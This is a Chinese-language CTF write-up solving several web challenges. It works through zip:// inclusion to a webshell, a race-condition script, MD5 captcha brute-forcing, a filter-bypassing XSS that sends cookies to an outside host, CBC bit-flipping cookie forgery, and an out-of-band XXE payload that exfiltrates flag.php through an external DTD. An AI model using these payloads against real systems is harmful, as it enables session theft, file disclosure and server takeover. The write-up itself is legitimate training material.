##兵者多诡
key: 利用zip://test.zip%23123/1.php（phar://test.zip/123/1.php）伪协议处理包含的后缀名和上传后缀名不同的问题
打开url很简单的一个页面，随便上传一个图片，发现必须上传png而且大小小于10k
观察url发现有一个fp=upload, 猜想这个可能是文件包含 ,用php://filter试了下可以，把源码下载下来
成功上传文件后有一个点此查看可以查看图片路径
看了下源码
if(!(include($fp.'.php')))

$imagekey = create_imagekey();
move_uploaded_file($name,"uploads/$imagekey.png");
这两个地方比较重要，可以发现包含的文件后缀名必须是php（00截断只能在php5.3之前能用，之后的版本%00会转成\0而不是null），上传后的文件后缀名必须是png。所以用zip伪协议，先上传一个zip文件为png后缀名，然后用zip文件包含即可
上传了一个zip中有1.php为写的马，然后访问
http://192.168.50.128/home.php?fp=zip://uploads/c93a97d38d89220ee1884c5a2ec29a1dd0381158.png#1
getshell


##跑的比香港记者还快
key: 条件竞争, .git中的README.md
打开网页发现有一个注册，一个登陆页面，随便注册个账号进去发现是权限不够
试了下有.git泄露，但是内容被删了（其实使用wvs跑的。）
想到.git一般有README.md，打开

- 2016.11.11
完成登陆功能，登陆之后在session将用户名和用户等级放到会话信息里面。
判断sessioin['level']是否能在index.php查看管理员才能看到的**东西**。
XD

- 2016.11.10
老板说注册成功的用户不能是管理员，我再写多一句把权限降为普通用户好啰。

- 2016.10 
我把注册功能写好了

先注册后提权，然后在登录后查看权限是否够，那么在注册后至提权前有一段时期账号是有管理员权限的，因此想到利用条件竞争提权，多个线程同时操作mysql，只要在降权前访问index.php就可以得到内容了，写个python跑一下
（如果这里是白名单的话就不存在竞争了- -即判断权限==admin才让访问）
（但是从题目上看，是admin先已经输入数据库了，然后普通用户再特殊设置的level关键字，说明admin是没有level的，所以可以猜测出网页的验证方式肯定是黑名单，即权限==普通用户的模式）
（题目名称其实也有提示是条件竞争）

# python3 code
import requests, re, random, string
from threading import Thread

url1 = 'http://127.0.0.1:8888/register.php'
url2 = 'http://127.0.0.1:8888/login.php'
url3 = 'http://127.0.0.1:8888/index.php'

def register(mes):
    requests.post(url = url1, data = mes)

def login(mes):
    sess = requests.session()
    sess.post(url = url2, data = mes)
    r = sess.get(url = url3)
    content = r.text
    content = re.findall(r'hctf', r.text, re.DOTALL)
    if len(content)>0:
        print("[*]success: message:",r.text)
    else :
        print("[x]fail")

def start():
    while True:
        username = "simon" + ''.join(random.choice(string.ascii_letters) for i in range(5))
        password = '123'
        mes = {"username": username, "password":password,'gogogo': '苟!'}
        t1 = Thread(target=register, args = (mes, ))
        t2 = Thread(target=login, args=(mes,))

        t1.start()
        t2.start()

        t1.join()
        t2.join()

if __name__ == "__main__":
    start()


##guestbook
key: xss绕过，MD5验证码爆破
打开页面一个留言板和MD5的验证码
对这种验证码直接写个小脚本爆破一下就行，直接全用数字了，反正只验证前4位
import hashlib
aim = "ebce"
captcha = 0

while (captcha < 100000000000):
    m1 = hashlib.md5()
    m1.update(str(captcha).encode())
    if (m1.hexdigest()[:4] == aim):
        print(str(captcha) + ":" + m1.hexdigest())
        break
    captcha += 1

考虑到留言板会插入留言到数据库，所以直接burp抓个验证码正确的包方便调试
（抓了包之后就不要再进入主页了，这样验证码不会刷新）
把留言改成<script>window.open("http://192.168.50.128/cookie.php?cookie="+escape(document.cookie));</script>，发现script被删了，双写script发现可以
<scrscriptipt>window.open("http://192.168.50.128/cookie.php?cookie="%2bescape(document.cookie));</scscriptript>
然后等admin访问
得到cookie：admin%3Dhctf2o16com30nag0gog0
和页面http://127.0.0.1:8888/admin_lorexxar.php
然后带着cookie访问即可，得到flag


##Secret Area


## 大图书馆的管理员
key: .git泄露的，CBC字节翻转获得管理员权限，上传后xxe注入
大图书馆两道题都可以用这个方法通解
先是大图书馆第一题git泄露得到源码，发现在manager.php中存在上传页面
但是必须要session['username']==='admin'
第一题因为知道密钥为23333，可以直接加密admin获得对应的cookie直接cookie欺骗获得管理员权限进入manager.php
第二题不知道密钥，查看加密的方式，发现是rijndael-128，即128bit(16字节)的CBC加密
每16个字节分为一个块，然后每个块与上一个块异或，第一个块和init_vactor异或
因为username不会超过16字节，所以只用修改init_vactor就可以直接修改username了
先注册一个admins的账号，得到cookie，cookie中包含了init_vactor和admins对应密文，总共32字节对应两个块
因为解密函数里面有删除最后的\0, 那么只要构造一个密文最后解密出来为admin\0就可以额获得admin的明文。（也可以注册个admix然后暴力枚举让x等于n的值，然后直接修改密文获得admin的密文）
只要加密算法里面存在cbc的异或运算，那么就可以这样来构造
admins 对应的第六位加密应该是 ord(s)^initvactor，那么只要让initvactor ^= ord(s)
因为异或运算有交换和结合律，加密就变成了 ord(s)^initvactor^ord(s) = 0 ^ initvactor,对应的明文就变成了chr(0) 
所以对应的算法
$string = urlsafe_b64decode('Zp8jLzTblnXAJd2sFKTAvdmSV3JeuaoT2zpe8Pjogyc');
$string[5] = chr(ord($string[5])^ord('s')^ord("\0")); //修改init_vactor第6位也就是admins中的s
$string = urlsafe_b64encode($string);
print_r($string);

虽然也可以用爆破，但是cbc字节翻转是这个原理
爆破：
$test = urlsafe_b64decode('Zp8jLzTblnXAJd2sFKTAvdmSV3JeuaoT2zpe8Pjogyc');
for ($i = 0;$i<127; $i++){
	$string = $test;
	$string[5] = chr($i);
	$string = urlsafe_b64encode($string);
	$tmp = decrypt($string);
	if ($tmp === 'admin'){
		print_r((string)$i.":".$tmp.":".$string."<br>");
	}
得到管理员权限进入manager.php
有一个上传页面，查看upload.php
//upload
$files = isset($_FILES['file']) ? $_FILES['file'] : exit();
if($files['type']!=="application/epub+zip") {
  exit("Not Allow type!");
}
//extract
$file = new ZipArchive;
$epub_name = $files['tmp_name'];
$extracted_path = 'uploads/'.basename($files['name'],".epub")."/";
if ($file->open($epub_name) === TRUE){
  $file->extractTo($extracted_path);
  $file->close();
}
//xmlparse
libxml_disable_entity_loader(false);
$container_info = simplexml_load_file($extracted_path."META-INF/container.xml", 'SimpleXMLElement', LIBXML_NOENT);
$source_file = $container_info->rootfiles->rootfile["full-path"];

限制了上传类型application/epub+zip，burp随便抓包改下
上传后会解压然后simplexml_load_file，上面把实体参数都开了很明显就是提示XXE注入
构造一个META-INF/container.xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
    <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=flag.php">（注意这里的相对路径也是相对根目录的）
    <!ENTITY % dtd SYSTEM "http://192.168.50.128/evil.dtd">
    %dtd;
    %send;
]>
<container​ ​version​=​"1.0"​ ​xmlns​=​"urn:oasis:names:tc:opendocument:xmlns:container">    ​
	<rootfiles>       ​
		<rootfile​ ​full-path​=​"content.opf"​ ​media-type​=​"application/oebps-package+xml"​/>      ​
	</rootfiles> 
</container> 
压缩成一个zip。在服务器上放一个evil.dtd:
<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://192.168.50.128/content.php?content=%file;'>">
%payload;
然后上传zip，查看服务器日志
192.168.50.1 - - [07/Dec/2016:00:31:15 +0800] "GET /content.php?content=PD9waHANCiRmbGFnID0gImhjdGZ7U2VyZW5hX2lzX3RoZV9sZWFkaW5nX3JvbGV9IjsNCg== HTTP/1.0" 404 289 "-" "-"
base64解码
<?php
$flag = "hctf{Serena_is_the_leading_role}";


